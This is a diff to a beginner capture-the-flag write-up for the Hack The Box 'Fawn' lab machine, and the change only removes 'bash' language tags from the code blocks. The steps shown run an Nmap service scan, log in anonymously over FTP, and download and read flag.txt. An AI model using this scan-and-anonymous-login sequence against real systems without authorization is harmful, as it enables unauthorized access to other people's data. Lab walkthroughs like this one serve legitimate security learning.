@@ -18,7 +18,7 @@ I connected to the Hack The Box VPN, then spawned the **Fawn** target machine an
 
 I ran an Nmap scan on the machine:
 
-```bash
+```
 nmap -sV -sC -Pn 10.129.197.22
 ```
 
@@ -52,13 +52,13 @@ command not found
 
 So I installed the FTP client:
 
-```bash
+```
 sudo apt install ftp
 ```
 
 Then I connected to the target using **anonymous login**:
 
-```bash
+```
 ftp 10.129.197.22
 
 Name: anonymous
@@ -67,7 +67,7 @@ Password: [just press Enter]
 
 Once logged in, I listed the files:
 
-```bash
+```
 ls
 ```
 
@@ -79,7 +79,7 @@ flag.txt
 
 Then I downloaded the file:
 
-```bash
+```
 get flag.txt
 ```
 
@@ -89,7 +89,7 @@ get flag.txt
 
 After downloading, I viewed the flag:
 
-```bash
+```
 cat flag.txt
 ```
 
